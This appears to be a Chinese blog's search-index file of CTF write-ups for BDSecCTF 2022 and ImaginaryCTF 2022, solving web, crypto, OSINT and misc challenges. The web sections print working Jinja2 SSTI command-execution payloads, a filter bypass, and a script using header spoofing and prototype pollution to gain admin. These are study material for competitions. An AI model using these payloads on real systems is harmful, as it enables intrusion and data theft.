<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BDSecCTF2022</title>
    <url>/2022/07/22/2022BDSecCTF/</url>
    <content><![CDATA[<p><img src="http://img.hzy2003628.top/202207212305269.png" alt="image-20220721230519190"></p>
<span id="more"></span>
<hr>
<h1 id="前言">前言</h1>
<p>这个国外的比赛我自己认为比较面向新手吧，但是我依然不能全做出来，继续努力继续努力</p>
<h1 id="web">Web</h1>
<h2 id="jungle-templating">Jungle Templating</h2>
<p><img src="http://img.hzy2003628.top/202207211845506.png" alt="image-20220721184455566"></p>
<p>初步判断是SSTI，会得出运算结果</p>
<p><img src="http://img.hzy2003628.top/202207211845309.png" alt="image-20220721184551241"></p>
<p>查看配置文件情况</p>
<p><img src="http://img.hzy2003628.top/202207211846030.png" alt="image-20220721184627928"></p>
<pre><code class="hljs plaintext">&#123;&#123;cycler.next.__globals__.os.popen(&#x27;nl *&#x27;)|max&#125;&#125;</code></pre>
<p><img src="http://img.hzy2003628.top/202207211851131.png" alt="image-20220721185115064"></p>
<p>BDSEC{Y3Y_7H1515_7H3_F146}</p>
<h2 id="awesome-note-keeping">Awesome Note Keeping</h2>
<p><img src="http://img.hzy2003628.top/202207212356207.png" alt="image-20220721235630128"></p>
<p>写笔记，试试呗，传个xss弹窗，发现是可以的，但是不存cookie应该也找不到啥东西，放弃这个思路</p>
<p><img src="http://img.hzy2003628.top/202207212358361.png" alt="image-20220721235816295"></p>
<p>看源码得到一行提示</p>
<pre><code class="hljs plaintext">Hi Seli, I have created this awesome note keeping web app today. I have saved a backup file index.php.bak for you. Download it and check it out.</code></pre>
<p>源码路径，打包下来审计，主要代码如下</p>
<pre><code class="hljs plaintext">&lt;?php
ini_set(&#x27;display_errors&#x27;, 1);
ini_set(&#x27;display_startup_errors&#x27;, 1);
error_reporting(E_ALL);
if (isset($_POST[&quot;note&quot;]) &amp;&amp; isset($_POST[&quot;note_title&quot;])) &#123;
    if (empty($_POST[&quot;note&quot;]) || empty($_POST[&quot;note_title&quot;])) &#123;
        echo &quot;All fields are required.&quot;;
    &#125; else if (strlen($_POST[&quot;note_title&quot;]) &gt;= 13) &#123;
        echo &quot;Note title is too long.&quot;;
    &#125; else if (strlen($_POST[&quot;note&quot;]) &gt;= 40) &#123;
        echo &quot;Note is too long.&quot;;
    &#125; else &#123;
        $note_title = str_replace(&quot;flag&quot;, &quot;&quot;, $_POST[&quot;note_title&quot;]);
        if (!empty($note_title)) &#123;
            if (file_exists($note_title . &quot;.txt&quot;)) &#123;
                echo &quot;There is already a note with that title and the note is &lt;br&gt;&quot;;
                $note_title = str_replace(&quot;flag&quot;, &quot;&quot;, $note_title);
                $myNote = fopen($note_title . &quot;.txt&quot;, &quot;r&quot;);
                echo fread($myNote, filesize($note_title . &quot;.txt&quot;));
                fclose($myNote);
            &#125; else &#123;
                $myNote = fopen($note_title . &quot;.txt&quot;, &quot;w&quot;);
                fwrite($myNote, $_POST[&quot;note&quot;]);
                fclose($myNote);
                echo &quot;Your note has been saved.&quot;;
            &#125;
        &#125; else &#123;
            echo &quot;Sorry ! You can&#x27;t create flag note.&quot;;
        &#125;
    &#125;
&#125;


if (isset($_GET[&quot;note_title&quot;]) &amp;&amp; !empty($_GET[&quot;note_title&quot;]) &amp;&amp; $_GET[&quot;note_title&quot;] != &quot;flag&quot;) &#123;
    if (file_exists($_GET[&quot;note_title&quot;] . &quot;.txt&quot;)) &#123;
        $myNote = fopen($_GET[&quot;note_title&quot;] . &quot;.txt&quot;, &quot;r&quot;);
        echo fread($myNote, filesize($_GET[&quot;note_title&quot;] . &quot;.txt&quot;));
        fclose($myNote);
    &#125; else &#123;
        echo &quot;Sorry ! Couldn&#x27;t find any note with that title.&quot;;
    &#125;
&#125;

?&gt;</code></pre>
<p>贼长，还得绕，看的我头疼，浅浅分析一下，note和note_title这俩变量都是post传参，对应的就是那两个填的内容，然后对传的内容进行了校验和长度的控制，其次就是这下面这个函数</p>
<blockquote>
<p>str_replace() 函数</p>
<p>str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。</p>
<p>例如：把字符串 “Hello world!” 中的字符 “world” 替换为 “Shanghai”：</p>
<pre><code class="hljs plaintext">&lt;?php
echo str_replace(&quot;world&quot;,&quot;Shanghai&quot;,&quot;Hello world!&quot;);
?&gt;</code></pre>
</blockquote>
<p>说实话得到flag的过程挺让我意外，目录穿越？？？，当时我看到当查询一个文件的时候payload会变成<code>?note_title=1</code>，然后我有测试…/…/…/etc/passwd，但是没有反应我就没管目录穿越，现在知道了这个验证方式不是唯一的</p>
<p>这道题目最终就是在本目录下直接读取flag，但是直接读肯定不行，因为会被替换成空格，所以payload如下</p>
<pre><code class="hljs plaintext">?note_title=./flag</code></pre>
<p><img src="http://img.hzy2003628.top/202207220009717.png" alt="image-20220722000918653"></p>
<p>BDSEC{tHe_n0t3_K33p1n6_4W350M3_N5}</p>
<h2 id="knight-squad-shop">Knight Squad Shop</h2>
<p><img src="http://img.hzy2003628.top/202207212309198.png" alt="image-20220721230949109"></p>
<p>这是一个，附件代码审计</p>
<p>初步查看也能知道这是个商店，可以购买东西，然后初始钱是一百，我们的目标就是那个Get flags，显然直接购买是不行的。</p>
<p>源码我先全部贴到这，慢慢分析</p>
<pre><code class="hljs plaintext">const express = require(&#x27;express&#x27;)
const session = require(&#x27;express-session&#x27;)
const fs = require(&#x27;fs&#x27;)

const app = express()

const products = require(&#x27;./product.json&#x27;)


const product = &#123;
    name: &#x27;Some Product&#x27;,
    price: 100,
    description: &#x27;A description of the product&#x27;,
    quantity: 1,
&#125;;

products[&#x27;flags&#x27;] = &#123;     // 这个就是我们最终要购买的产品，我在这里被坑了一波，好久才反应过来
    name: &#x27;Get flags&#x27;,
    price: 2.5e+25,    // 它的价格，显然直接买不起
    description: fs.readFileSync(&#x27;flag.txt&#x27;, &#x27;utf8&#x27;).trim(),     // 内容就是这个flag.txt
    quantity: 1     // 数量是一个
&#125;

app.use(express.json(&#123; extended: true &#125;));
app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);

app.use(session(&#123;
    secret: require(&#x27;crypto&#x27;).randomBytes(64).toString(&#x27;hex&#x27;),
    resave: false,
    saveUninitialized: true,
&#125;));

app.use((req, res, next) =&gt; &#123;
    if(req.session.money !== undefined) &#123;
        return next();
    &#125;
    req.session.money = 100;   //  初始值是100

    if (req.ip == &#x27;127.0.0.1&#x27;) &#123;    // 需要本地，这里想到的是加个XFF头来进行绕过
        req.session.admin = true;
    &#125;
    next();
&#125;);

app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;    // 路由
    res.render(&#x27;index&#x27;, &#123; products, money: req.session.money&#125;)
&#125;)

app.post(&#x27;/api/v1/sell&#x27;, (req, res) =&gt; &#123;   // 路由。功能就是sell
    for (const [key, value] of Object.entries(req.body)) &#123;
        if (key === &#x27;flags&#x27; &amp;&amp; !req.session.admin) &#123;
            continue;
        &#125;

        if (!products[key]) &#123;
            products[key] = JSON.parse(JSON.stringify(product));
        &#125;

        for (const [k, v] of Object.entries(value)) &#123;
            if (k === &#x27;quantity&#x27;) &#123;
                products[key][k] += v;
            &#125; else &#123;
                products[key][k] = v;
            &#125;
        &#125;
    &#125;

    res.send(&#x27;Sell successful&#x27;);
&#125;);

app.post(&#x27;/api/v1/buy&#x27;, (req, res) =&gt; &#123;   // 路由，功能是buy
    const &#123; product, quantity &#125; = req.body;

    if (typeof product === &#x27;undefined&#x27; || typeof quantity !== &#x27;number&#x27; || quantity &lt;= 0 || !products[product]) &#123;
        return res.status(400).send(&#x27;Invalid request&#x27;);
    &#125;

    if (products[product].quantity &gt;= quantity) &#123;
        if (req.session.money &gt;= products[product].price * quantity) &#123;
            products[product].quantity -= quantity;
            req.session.money -= products[product].price * quantity;
            res.json(products[product]);
        &#125; else &#123;
            res.status(402).send(&#x27;Not enough money&#x27;);
        &#125;
    &#125; else &#123;
        res.status(451).send(&#x27;Not enough product&#x27;);
    &#125;
&#125;);

app.post(&#x27;/api/v1/money&#x27;, (req, res) =&gt; &#123;   //路由，功能是管理money的加减，这里需要是admin，否则没权限
    if (req.session.admin) &#123;  // 判断是否是admin
        req.session.money += req.body.money;
        res.send(&#x27;Money added&#x27;);
    &#125; else &#123;
        res.status(403).send(&#x27;Not admin&#x27;);
    &#125;
&#125;);

app.listen(3000, () =&gt; &#123;
    console.log(&#x27;Listening on port 3000&#x27;);
&#125;);</code></pre>
<p>下面单拉出一个路由来分析—sell</p>
<pre><code class="hljs plaintext">app.post(&#x27;/api/v1/sell&#x27;, (req, res) =&gt; &#123;   // 路由。功能就是sell
    for (const [key, value] of Object.entries(req.body)) &#123;
        if (key === &#x27;flags&#x27; &amp;&amp; !req.session.admin) &#123;
            continue;
        &#125;

        if (!products[key]) &#123;
            products[key] = JSON.parse(JSON.stringify(product));
        &#125;

        for (const [k, v] of Object.entries(value)) &#123;
            if (k === &#x27;quantity&#x27;) &#123;
                products[key][k] += v;
            &#125; else &#123;
                products[key][k] = v;
            &#125;
        &#125;
    &#125;

    res.send(&#x27;Sell successful&#x27;);
&#125;);</code></pre>
<p>这个就是出售的功能，不仅可以买还可以卖，但是我们可以看到它不允许卖flag，只要卖flag就直接跳了，相当于把flag这个产品给拦截了。</p>
<p>然后就是管理钱的那个路由，刚才也说到了，只能是admin才可以有权限。XFF头就可以实现admin，在这样的情况下我测试了，可以一直卖，但是没有收益，毫无用处，继续分析</p>
<pre><code class="hljs plaintext">
for (const [k, v] of Object.entries(value)) &#123;
    if (k === &#x27;quantity&#x27;) &#123;
        products[key][k] += v;
    &#125; else &#123;
        products[key][k] = v;
    &#125;
&#125;</code></pre>
<p>这个是控制数量的，每个产品的数量，可以看到quantity是可以根据v写入数据的，说明我们可以讲产品价格改成任意值</p>
<p>在购买的时候有个条件</p>
<pre><code class="hljs plaintext">if (req.session.money &gt;= products[product].price * quantity) &#123;
            products[product].quantity -= quantity;</code></pre>
<p>这个if条件是说明你买啥就会扣你的钱来进行，不严格，简单来讲就是你把价格调成负数，你越买，钱越多</p>
<p>整体分析就是这样，思路就来了，我们可以先卖，卖的价格为负数，然后再买自己卖的，这样钱就够了，然后再买flag</p>
<p>写个脚本传一下吧</p>
<pre><code class="hljs plaintext">import requests

s = requests.Session()

print(s.post(&#x27;http://206.189.236.145:3000/api/v1/sell&#x27;, headers=&#123;&#x27;X-Forwarded-For&#x27;: &#x27;127.0.0.1&#x27;&#125;, json=&#123;&#x27;__proto__&#x27;: &#123;&#x27;admin&#x27;: &#x27;gg&#x27;&#125;, &#x27;mango&#x27;: &#123; &#x27;quantity&#x27;: 1 &#125;&#125;).text)  //  卖
print(s.post(&#x27;http://206.189.236.145:3000/api/v1/money&#x27;,json=&#123; &#x27;money&#x27;: 2.5e+25 + 1 &#125;).text)   //买
print(s.post(&#x27;http://206.189.236.145:3000/api/v1/buy&#x27;, json=&#123; &#x27;product&#x27;: &#x27;flags&#x27;, &#x27;quantity&#x27;: 1 &#125; ).json()[&#x27;description&#x27;])   // 买</code></pre>
<p>最终成功实现，得到flag</p>
<p><img src="http://img.hzy2003628.top/202207212336720.png" alt="image-20220721233640644"></p>
<p>BDSEC{mummy_i_can’t_write_javaScript}</p>
<blockquote>
<p>至于我说到的我刚才被难到的地方是我一直把产品当成Get flags，脚本一直报错最后一步买flag的地方，也是因为代码审计不认真，毕竟代码说的很清楚，以后主要代码一定要认真看<img src="http://img.hzy2003628.top/202207212339662.png" alt="image-20220721233917609"></p>
</blockquote>
<h1 id="networking">Networking</h1>
<h2 id="victim-amp-attacker">Victim &amp; Attacker</h2>
<p>流量分析，最终确定一个流量是攻击流量</p>
<p><img src="http://img.hzy2003628.top/202207211944182.png" alt="image-20220721194405112"></p>
<p><img src="http://img.hzy2003628.top/202207211944075.png" alt="image-20220721194422016"></p>
<p>服务器ip是192.168.1.13</p>
<p>攻击者ip是192.168.1.10</p>
<p>BDSEC{192.168.1.13_192.168.1.10}</p>
<h1 id="misc">Misc</h1>
<h2 id="find-me-inside">Find Me Inside</h2>
<blockquote>
<p>I’m stuck in the Dark.</p>
</blockquote>
<p>下载附件是个gif动图</p>
<p><img src="http://img.hzy2003628.top/202207212110546.png" alt="image-20220721211040441"></p>
<p>隐藏了压缩包，改类型，解压得到cry100</p>
<p><img src="http://img.hzy2003628.top/202207212111431.png" alt="image-20220721211130360"></p>
<pre><code class="hljs plaintext">Sld xlfow R yv hl olhg
Rm z kozxv R pmld hl dvoo?
Sld xlfow R yv hl yilpvm
Rm z uznrob hl gltvgsvi?
Sld xlfow R yv hl olmvob
Hfiilfmwvw yb hl nzmb?
Sld xlfow R yv hl fmszkkb
Hfiilfmwvw yb hl nfxs yvzfgb?
Sld xlfow R yv nv
Dsvm vevm R ivnzrm z nbhgvib?
YWHVX&#123;N33n_gsv_yfggviuob_tlvh_fk_fk_zmw_zdzb&#125;</code></pre>
<p>Atbash解密，得到flag</p>
<pre><code class="hljs plaintext">how could i be so lost
in a place i know so well?
how could i be so broken
in a family so together?
how could i be so lonely
surrounded by so many?
how could i be so unhappy
surrounded by so much beauty?
how could i be me
when even i remain a mystery?
bdsec&#123;m33m_the_butterfly_goes_up_up_and_away&#125;
// BDSEC&#123;M33m_the_butterfly_goes_up_up_and_away&#125;</code></pre>
<h1 id="cryptography">Cryptography</h1>
<h2 id="vipx01">VIPx01</h2>
<blockquote>
<p>My friend gave me his game username and game id . Can decode game id ?</p>
<p>User : rot</p>
<p>Game ID : OQFRP{pelcg0_ne3_nj3f0z3}</p>
<p>Flag Format : BDSEC{s0m3thing_here}</p>
</blockquote>
<p>rot13解密</p>
<p>BDSEC{crypt0_ar3_aw3s0m3}</p>
<h2 id="基本上是-rsa">基本上是 RSA</h2>
<blockquote>
<p>RSA cryptosystem uses modular arithmetic to create an asymmetric encryption system. However, there are some pitfalls and weakness. Can you exploit it?</p>
<blockquote>
<p>N: 1280678415822214057864524798453297819181910621573945477544758171055968245116423923</p>
<p>E: 65537</p>
<p>C: 241757357533719849989659127349827982677055294256023833052829147857534659015212862</p>
</blockquote>
</blockquote>
<p>RSAtool，工具一把梭</p>
<p>BDSEC{r54_i5_fUn_r16h7?}</p>
<h1 id="osint">OSINT</h1>
<h2 id="find-rejvi">Find Rejvi</h2>
<blockquote>
<p>I just met a girl named Rejvi Khan. She told me to find her in social media. I searched on Facebook but didn’t find her. I think she is using any other social media. Can you find her ?</p>
<p>Flag format : BDSEC{s0mething_here}</p>
</blockquote>
<p>就是搜这个人，各种社交软件都搜搜，最终锁定mastodon</p>
<p><img src="http://img.hzy2003628.top/202207220037687.png" alt="image-20220722003759533"></p>
<p>扫码得到flag</p>
<p><img src="http://img.hzy2003628.top/202207220039982.png" alt="image-20220722003926823"></p>
<p>BDSEC{yoU_goT_m3__oS1nT_I5_fUn_r1Gh7}</p>
<h1 id="programming">Programming</h1>
<h2 id="find-the-cost">Find the Cost</h2>
<blockquote>
<p>Assume every node as a city. Find the cost of the shortest yet most efficient &amp; the longest and most inefficient route for a person to travel each city exactly once and return to the origin city.</p>
<p>Flag Format: BDSEC{minimum_cost,maximum_cost}</p>
<p>Flag Example: BDSEC{12,89}</p>
</blockquote>
<p>这个题目就是找最短路径最省钱和最长路径最费钱的俩种方案</p>
<p><img src="http://img.hzy2003628.top/202207220044344.png" alt="image-20220722004448243"></p>
<p>有很多种解法，可以花树状图进行分析</p>
<p>最终结果，最少花费35，最多花费47</p>
<p>flag为BDSEC{35,47}</p>
<h1 id="总结">总结</h1>
<p>CTF比赛考察点还是比较多的，学习的时候也是比较广，比较杂，就要靠平时多学多积累，比赛多参加，还有就是最重要的审计代码，沉下心来，做题一定要沉下心来，要不然就会丢失很多分，收工！</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ImaginaryCTF 2022</title>
    <url>/2022/07/19/2022ImaginaryCTF/</url>
    <content><![CDATA[<p><img src="http://img.hzy2003628.top/202207191106531.png" alt="image.png"></p>
<span id="more"></span>
<hr>
<h1 id="前言">前言</h1>
<p>这个比赛题量给到位，而且都算是可以接受的题目，考的内容涵盖也很多，非常值得学习一下，当然，我比赛过程中没出几道，菜鸡继续学习~~~</p>
<h1 id="misc">misc</h1>
<h2 id="discord"><strong>Discord</strong></h2>
<blockquote>
<p>Join our Discord community for updates and support! If you would like to do some more CTF after this competition, we do host daily CTF challenges on our Discord server as well. Join at <a href="https://discord.gg/ctf">https://discord.gg/ctf</a> . You can find the flag for this challenge in the channel .<code>#imaginaryctf-2022</code></p>
</blockquote>
<p>签到题，进去就给flag</p>
<p>ictf{stay_tuned_after_the_ctf_for_daily_ctf_challenges!}</p>
<h2 id="sanity-check">Sanity Check</h2>
<p>Welcome to ImaginaryCTF 2022! All flags are written in flag format unless otherwise stated. Have fun and enjoy the challenges!<code>ictf&#123;s0m3_1337_f1ag&#125;</code></p>
<p><img src="http://img.hzy2003628.top/202207171919906.png" alt="image-20220717191955841"></p>
<p>ictf{w3lc0m3_t0_1m@g1nary_c7f_2022!}</p>
<h2 id="sponsors">Sponsors</h2>
<blockquote>
<p>The ImaginaryCTF team would like to thank DigitalOcean, Google Cloud, and Trail of Bits for sponsoring this CTF!</p>
<p>Learn more about our sponsors at the links below:</p>
<ul>
<li>Trail of Bits: <a href="https://www.trailofbits.com/">https://www.trailofbits.com/</a></li>
<li>DigitalOcean: <a href="https://youtu.be/xw5UBDZMOIA">https://youtu.be/xw5UBDZMOIA</a></li>
<li>Google Cloud: <a href="https://cloud.google.com/">https://cloud.google.com/</a></li>
</ul>
<p>One of them might contain a flag… 👀</p>
</blockquote>
<p>在youtube里看到了flag</p>
<p><img src="http://img.hzy2003628.top/202207171925088.png" alt="image-20220717192542923"></p>
<p>ictf{digitalocean_r0cks!}</p>
<h1 id="web">web</h1>
<h2 id="democracy">Democracy</h2>
<blockquote>
<p><strong>Description</strong></p>
<p>This challenge has been shut down. The flag is .<code>ictf&#123;i'm_sure_you_0btained_this_flag_with0ut_any_sort_of_trickery...&#125;</code></p>
<p>I’m tired of all these skill-based CTF challenges. Y’know what we need more of here? Politics! Simply convince (or strongarm) your fellow competitors to vote for you. The top 1% of players who have the most votes (or top 50, whichever is less) will recieve the flag. This voting will occur 5 times per hour. Keep in mind that no matter how many accounts you make, you can only vote once per IP. Good luck, and happy campaigning!</p>
</blockquote>
<p>ictf{i’m_sure_you_0btained_this_flag_with0ut_any_sort_of_trickery…}</p>
<h2 id="ssti-golf">SSTI Golf</h2>
<blockquote>
<p>Just in case you didn’t get <em>enough</em> golf with the other challenge. Flag is in an arbitrarily named file, but in the same directory.</p>
</blockquote>
<p>就是考察对SSTI的基础认知</p>
<p>进地址f12得到一段代码</p>
<pre><code class="hljs plaintext">
#!/usr/bin/env python3

from flask import Flask, render_template_string, request, Response

app = Flask(__name__)

@app.route(&#x27;/&#x27;)   // 根目录路由
def index():
    return Response(open(__file__).read(), mimetype=&#x27;text/plain&#x27;)

@app.route(&#x27;/ssti&#x27;)   ssti路由
def ssti():
    query = request.args[&#x27;query&#x27;] if &#x27;query&#x27; in request.args else &#x27;...&#x27;   请求query
    if len(query) &gt; 48:   //限制长度要小于48
        return &quot;Too long!&quot;
    return render_template_string(query)

app.run(&#x27;0.0.0.0&#x27;, 1337)</code></pre>
<p>可以看到并没有过滤什么，先来个运算看看会不会执行</p>
<p><img src="http://img.hzy2003628.top/202207172028243.png" alt="image-20220717202843182"></p>
<h3 id="法一">法一</h3>
<p>查看配置，全局搜索得到flag</p>
<p><img src="http://img.hzy2003628.top/202207172030778.png" alt="image-20220717203025645"></p>
<h3 id="法二">法二</h3>
<pre><code class="hljs plaintext">&#123;&#123;cycler.next.__globals__.os.popen(&#x27;nl *&#x27;)|max&#125;&#125;</code></pre>
<p><img src="http://img.hzy2003628.top/202207191044409.png" alt="image-20220719104410342"></p>
<h3 id="法三">法三</h3>
<pre><code class="hljs plaintext">&#123;&#123;lipsum.__globals__.os.popen(&#x27;cat *&#x27;).read()&#125;&#125;</code></pre>
<p><img src="http://img.hzy2003628.top/202207191044352.png" alt="image-20220719104446281"></p>
<p>ictf{F!1+3r5s!?}</p>
<h2 id="minigolf">minigolf</h2>
<blockquote>
<p>Too much Flask last year… let’s bring it back again.</p>
</blockquote>
<p>查看源代码内容如下</p>
<pre><code class="hljs plaintext">
from flask import Flask, render_template_string, request, Response
import html

app = Flask(__name__)

blacklist = [&quot;&#123;&#123;&quot;, &quot;&#125;&#125;&quot;, &quot;[&quot;, &quot;]&quot;, &quot;_&quot;]       // 黑名单过滤

@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])  //传参方式
def home(): 
  print(request.args)
  if &quot;txt&quot; in request.args.keys():
    txt = html.escape(request.args[&quot;txt&quot;])
    if any([n in txt for n in blacklist]):
      return &quot;Not allowed.&quot;  // 触发黑名单
    if len(txt) &lt;= 69:        // 长度限制
      return render_template_string(txt)
    else:
      return &quot;Too long.&quot;
  return Response(open(__file__).read(), mimetype=&#x27;text/plain&#x27;)   // 返回这个值应该就是目标，也就是flag

app.run(&#x27;0.0.0.0&#x27;, 1337)</code></pre>
<p>本来考虑的是flask的ssti漏洞，黑名单里有{}，[],还有_，，基本断定就是这个漏洞，只是需要绕过，所以这样直接传的话肯定会被拦截</p>
<p><img src="http://img.hzy2003628.top/202207172039471.png" alt="image-20220717203957420"></p>
<p><img src="http://img.hzy2003628.top/202207191439191.png" alt="image-20220719143958098"></p>
<p><img src="http://img.hzy2003628.top/202207180010041.png" alt="image-20220718001056918"></p>
<p>后边考虑这个玩意，但是绕过之后发现长度太长，不行</p>
<pre><code class="hljs plaintext">().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;cat /fl4g|base64&#x27;).read()

().\x5f\x5class\x5f\x5.\x5f\x5bases\x5f\x5[0].\x5f\x5subclasses\x5f\x5()[177].\x5f\x5init\x5f\x5.\x5f\x5globals\x5f\x5.\x5f\x5builtins\x5f\x5[&#x27;open&#x27;](&#x27;cat /fl4g|base64&#x27;).read()</code></pre>
<p>首先先验证一下能不能用\x5f代替下划线吧,发现不行</p>
<p>重新捋一下思路，既然可以读取配置文件，那我们不妨读取config.a查看配置</p>
<pre><code class="hljs plaintext">&#123;%print(config.a)%&#125;       //全局变量</code></pre>
<p><img src="http://img.hzy2003628.top/202207191149637.png" alt="image-20220719114917571"></p>
<p>读取flag</p>
<pre><code class="hljs plaintext">&#123;%print(lipsum|attr(config.a)).os.popen(config.g).read()%&#125;</code></pre>
<p><img src="http://img.hzy2003628.top/202207191152888.png" alt="image-20220719115257822"></p>
<p>ictf{whats_in_the_flask_tho}</p>
<h2 id="roocookie">rooCookie</h2>
<blockquote>
<p>Roo seems to have left his computer on, can you find his password?</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207191017962.png" alt="image-20220719101718858"></p>
<p>查看cookie，说的是把密码放到了cookie里面</p>
<p><img src="http://img.hzy2003628.top/202207191018821.png" alt="image-20220719101824753"></p>
<p>token中是一堆二进制，但是尝试直接解密不行，应该是有自己的加密算法</p>
<p>看源码得到加密算法</p>
<pre><code class="hljs plaintext">function createToken(text) &#123;
   let encrypted = &quot;&quot;;
  for (let i = 0; i &lt; text.length; i++) &#123;    //  明文for循环进行加密
      encrypted += ((text[i].charCodeAt(0)-43+1337) &gt;&gt; 0).toString(2)    // tostring方法最终转换二进制   charCodeAt方法是返回unicode编码
  &#125;
  document.cookie = encrypted
&#125;</code></pre>
<p>在算法那一行有一个假象就是按位运算，但是&gt;&gt;0所以位是不变的</p>
<p>逆向一下，首先按照11个字符长度为一组分组，二进制转十进制，再-1337+43</p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">token = &quot;101100000111011000000110101110011101100000001010111110010101101111101011110111010111001110101001011101001100001011000000010101111101101011111011010011000010100101110101001101001010010111010101111110101011011111011000000110110000001101100001011010111110110110000000101011100101010100101110100110000101011101111010111000110110000010101011101001011000100110101110110101001111101010111111010101000001101011011011010100010110101110110101011011111010100010110101101101101100001011010110111110101000011101011111001010100010110101101101101100000101010011111010100111110101011011011010111000010101000010101011100101011000101110100110000&quot;

for i in range(len(token) // 11):
    tmp = &quot;0b&quot; + token[i*11:i*11+11]
    print(chr(int(tmp,2)-1337+43), end=&quot;&quot;)
print(&quot;&quot;)

// username=&quot;roo&quot; &amp; password=&quot;ictf&#123;h0p3_7ha7_wa5n7_t00_b4d&#125;&quot;</code></pre>
<p>ictf{h0p3_7ha7_wa5n7_t00_b4d}</p>
<blockquote>
<p>疑问： 在这道题刚开始我是有个疑问的，就是为什么要是11个长度为一组？</p>
<p>答：ASCII字符最多只能达到8位，但是1337是十一位，所以改大小必须是最大大小，也就是11个长度为一组  //  1337—&gt;10100111001</p>
<p>引用外国友人的一句话，就是这么个道理</p>
<p>with 1 bit (wich is either 0 or 1 ) you have a total of 2 possibles values, for 2 bits (00,01,10,11) you have 4 possibilites and so on … for n bits you have 2^n possibles values, if we fit into 8 bits we have only 256 possible values so 1294(wich is added to all char value)  don’t fit into it and need extra bits</p>
</blockquote>
<h2 id="button">button</h2>
<blockquote>
<p>Apparently one of these buttons isn’t useless…</p>
</blockquote>
<p>起初看到描述我知道肯定有一个标签是出众的</p>
<p><img src="http://img.hzy2003628.top/202207191123409.png" alt="image-20220719112304352"></p>
<p><img src="http://img.hzy2003628.top/202207191122857.png" alt="image-20220719112241783"></p>
<p><img src="http://img.hzy2003628.top/202207191123054.png" alt="image-20220719112320005"></p>
<p>通过推理，我认为flag应该是ictf{y0u_f0und_7h3_f1ag},但是交了不对，不知道该从何下手了</p>
<p>这个时候看到好多标签都是notSusFunction，只有一个是motSusFunction，然后点那个点，就可以出来flag了，该说不说，这题有点狗</p>
<p>没有颜色的点，所以要多试几次，或者给标签加个颜色</p>
<p><img src="http://img.hzy2003628.top/202207191129346.png" alt="image-20220719112928279"></p>
<p>ictf{y0u_f0und_7h3_f1ag!}</p>
<h2 id="maas">maas</h2>
<blockquote>
<p>Cookie Stream is back, with a new auth system and something way more useful than rickrolling people.</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207191304838.png" alt="image-20220719130402655"></p>
<p>代码审计，<a href="http://xn--app-ns9d50jexau81gqjgez1b9gcr57gh9t.py">直接贴出来关键代码app.py</a></p>
<pre><code class="hljs plaintext">from flask import Flask, render_template, request, make_response, redirect
from hashlib import sha256
import time
import uuid
import random

app = Flask(__name__)

memes = [l.strip() for l in open(&quot;memes.txt&quot;).readlines()]
users = &#123;&#125;
taken = []

def adduser(username):
  if username in taken:
    return &quot;username taken&quot;, &quot;username taken&quot;
  password = &quot;&quot;.join([random.choice(&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;) for _ in range(30)])
  cookie = sha256(password.encode()).hexdigest()
  users[cookie] = &#123;&quot;username&quot;: username, &quot;id&quot;: str(uuid.uuid1())&#125;
  taken.append(username)
  return cookie, password

@app.route(&#x27;/&#x27;)
def index():
    return redirect(&quot;/login&quot;)

@app.route(&#x27;/users&#x27;)
def listusers():
  return render_template(&#x27;users.html&#x27;, users=users)

@app.route(&#x27;/users/&lt;id&gt;&#x27;)
def getuser(id):
  for k in users.keys():
    if users[k][&quot;id&quot;] == id:
      return f&quot;Under construction.&lt;br&gt;&lt;br&gt;User &#123;users[k][&#x27;username&#x27;]&#125; is a very cool user!&quot;

@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])
def login():
  if request.method == &quot;POST&quot;:
    resp = make_response(redirect(&#x27;/home&#x27;))
    cookie = sha256(request.form[&quot;password&quot;].encode()).hexdigest()
    resp.set_cookie(&#x27;auth&#x27;, cookie)
    return resp
  else:
    return render_template(&#x27;login.html&#x27;)

@app.route(&#x27;/register&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])
def register():
  if request.method == &quot;POST&quot;:
    cookie, password = adduser(request.form[&quot;username&quot;])
    resp = make_response(f&quot;Username: &#123;request.form[&#x27;username&#x27;]&#125;&lt;br&gt;Password: &#123;password&#125;&quot;)
    resp.set_cookie(&#x27;auth&#x27;, cookie)
    return f&quot;Username: &#123;request.form[&#x27;username&#x27;]&#125;&lt;br&gt;Password: &#123;password&#125;&quot;
  else:
    return render_template(&#x27;register.html&#x27;)

@app.route(&#x27;/home&#x27;, methods=[&#x27;GET&#x27;])
def home():
    cookie = request.cookies.get(&#x27;auth&#x27;)
    username = users[cookie][&quot;username&quot;]
    if username == &#x27;admin&#x27;:
        flag = open(&#x27;flag.txt&#x27;).read()
        return render_template(&#x27;home.html&#x27;, username=username, message=f&#x27;Your flag: &#123;flag&#125;&#x27;, meme=random.choice(memes))
    else:
        return render_template(&#x27;home.html&#x27;, username=username, message=&#x27;Only the admin user can view the flag.&#x27;, meme=random.choice(memes))

@app.errorhandler(Exception)
def handle_error(e):
    return redirect(&#x27;/login&#x27;)

def initialize():
  random.seed(round(time.time(), 2))
  adduser(&quot;admin&quot;)

initialize()
app.run(&#x27;0.0.0.0&#x27;, 8080)</code></pre>
<p>分析一下不难看出，这是个通过cookie来登录用户的系统，利用cookie进行身份验证。同时在初始化函数时根据当前时间随机生成一个数值，并创建admin用户。</p>
<p><img src="http://img.hzy2003628.top/202207191313772.png" alt="image-20220719131358676"></p>
<p>/register在这个路由下，实现的注册功能，当输入一个username时就会跳转到adduser(),去执行那个方法，先是检测有无重复的ID，没有的话就会创建密码并返回，然后输入的username时通过uuid进行创建并随机生成一个三十位字符的密码，采用哈希加密，当作cookie</p>
